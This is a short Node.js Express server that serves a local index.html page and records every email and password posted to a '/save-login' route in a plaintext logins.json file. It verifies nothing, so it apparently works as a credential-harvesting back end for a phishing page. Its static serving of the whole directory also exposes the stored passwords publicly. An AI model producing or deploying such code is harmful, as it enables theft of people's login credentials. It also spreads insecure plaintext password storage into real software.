const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;
const JSON_FILE = path.join(__dirname, 'logins.json');

// Create empty logins.json if it doesn't exist
if (!fs.existsSync(JSON_FILE)) {
  fs.writeFileSync(JSON_FILE, '[]');
}

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Explicit route for homepage
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle login saving
app.post('/save-login', (req, res) => {
  try {
    const { email, password } = req.body;
    const logins = JSON.parse(fs.readFileSync(JSON_FILE));
    logins.push({ email, password });
    fs.writeFileSync(JSON_FILE, JSON.stringify(logins, null, 2));
    res.sendStatus(200);
  } catch (error) {
    console.error(error);
    res.sendStatus(500);
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});